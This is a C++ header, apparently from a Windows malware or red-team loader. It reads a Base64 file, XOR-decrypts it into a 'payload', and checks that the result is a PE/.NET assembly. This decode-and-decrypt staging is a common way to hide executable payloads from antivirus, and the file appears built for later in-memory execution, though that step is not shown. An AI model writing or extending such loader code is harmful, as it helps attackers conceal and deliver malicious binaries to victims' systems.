#pragma once

#include <vector>
#include <string>
#include <fstream>
#include <iostream>
#include <Windows.h>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")

using namespace std;


vector<unsigned char> Base64Decode(const string& base64Data) {
    DWORD decodedLength = 0;


    if (!CryptStringToBinaryA(
        base64Data.c_str(),
        base64Data.length(),
        CRYPT_STRING_BASE64,
        NULL,
        &decodedLength,
        NULL,
        NULL
    )) {
        cerr << "[-] Failed to calculate Base64 decode length. Error: " << GetLastError() << endl;
        return vector<unsigned char>();
    }


    vector<unsigned char> decoded(decodedLength);


    if (!CryptStringToBinaryA(
        base64Data.c_str(),
        base64Data.length(),
        CRYPT_STRING_BASE64,
        decoded.data(),
        &decodedLength,
        NULL,
        NULL
    )) {
        cerr << "[-] Failed to decode Base64. Error: " << GetLastError() << endl;
        return vector<unsigned char>();
    }

    decoded.resize(decodedLength);
    return decoded;
}


vector<unsigned char> XorDecrypt(const vector<unsigned char>& data, const unsigned char* key, size_t keyLength) {
    vector<unsigned char> decrypted(data.size());

    for (size_t i = 0; i < data.size(); i++) {
        decrypted[i] = data[i] ^ key[i % keyLength];
    }

    return decrypted;
}


string ReadTextFile(const string& filename) {
    ifstream file(filename);

    if (!file.is_open()) {
        cerr << "[-] Failed to open file: " << filename << endl;
        return "";
    }

    string content((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();

    return content;
}


vector<unsigned char> LoadAndDecryptPayload(const string& filename, const unsigned char* key, size_t keyLength) {

    string base64Content = ReadTextFile(filename);
    if (base64Content.empty()) {
        cerr << "[-] Failed to read encrypted file!" << endl;
        return vector<unsigned char>();
    }


    vector<unsigned char> encryptedData = Base64Decode(base64Content);
    if (encryptedData.empty()) {
        cerr << "[-] Failed to decode Base64!" << endl;
        return vector<unsigned char>();
    }


    vector<unsigned char> decryptedData = XorDecrypt(encryptedData, key, keyLength);

    return decryptedData;
}


bool IsValidDotNetAssembly(const vector<unsigned char>& data) {
    if (data.size() < 64) {
        return false;
    }

    if (data[0] != 0x4D || data[1] != 0x5A) {
        return false;
    }


    DWORD peOffset = *reinterpret_cast<const DWORD*>(&data[0x3C]);

    if (peOffset + 4 > data.size()) {
        return false;
    }

    if (data[peOffset] != 0x50 || data[peOffset + 1] != 0x45) {
        return false;
    }

    return true;
}
